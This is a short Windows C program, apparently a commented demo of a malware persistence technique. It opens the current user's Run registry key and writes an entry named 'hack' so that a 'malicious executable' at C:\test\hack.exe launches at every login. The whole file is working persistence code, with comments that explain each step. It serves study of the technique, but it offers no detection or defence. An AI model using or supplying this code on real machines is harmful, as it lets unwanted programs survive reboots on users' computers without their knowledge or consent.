#include <windows.h>
#include <string.h>

int main(int argc, char *argv[])
{
    HKEY hkey = NULL;
    // Malicious app
    /*
    Path to malicious executable that will be run at startup
    */
    const char *exe = "C:\\test\\hack.exe";

    // Registry Modification
    //  open windows registry run key for writing
    // This key contains programs that automatically run when a user logs in
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,                                            // current user's hive
        (LPCSTR) "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", // subkey Path
        0,                                                            // reserved must be 0
        KEY_WRITE,                                                    // Access rights-Write permission
        &hkey                                                         // handle to opened key
    );

    // check if the registry key was opened successfully
    if (result == ERROR_SUCCESS)
    {
        // Create a persistence entry
        // Add a new value to the run key that points to our malicious exe
        // Ensures malware runs every time the user logs in
        RegSetValueEx(
            hkey,                 // handle to open registry key
            (LPCSTR) "hack",      // Value name(apears in registry edition)
            0,                    // reserved
            REG_SZ,               // Data Type: null-terminated string
            (unsigned char *)exe, // Data: path to malicious exe
            strlen(exe) + 1       // Data size: string length + null terminator
        );
        // close the registry key handle to free system resources
        RegCloseKey(hkey);
    }

    return 0;
}